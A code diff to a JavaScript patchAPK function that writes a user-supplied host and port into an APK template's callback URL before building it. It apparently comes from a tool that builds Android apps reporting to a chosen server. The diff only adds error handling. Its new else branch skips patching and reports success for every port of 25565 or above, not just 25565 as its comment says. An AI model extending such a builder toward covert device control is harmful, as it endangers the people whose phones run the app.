@@ -36,13 +36,19 @@ function patchAPK(URI, PORT, cb) {
     if (portInt < 25565) {
         fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
             if (err) return cb('File Patch Error - READ')
-            var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + URI + ":" + portInt);
+            
+            // Patch 3: Guard against missing markers
+            let startIdx = data.indexOf("http://");
+            let endIdx = data.indexOf("?model=");
+            if (startIdx === -1 || endIdx === -1) return cb('Corrupted APK Template - Markers Missing');
+
+            var result = data.replace(data.substring(startIdx, endIdx), "http://" + URI + ":" + portInt);
             fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
                 if (err) return cb('File Patch Error - WRITE')
                 else return cb(false)
             });
         });
-    }
+    } else return cb(false); // Patch 4: Ensure callback fires even if port is 25565
 }
 
 function buildAPK(cb) {
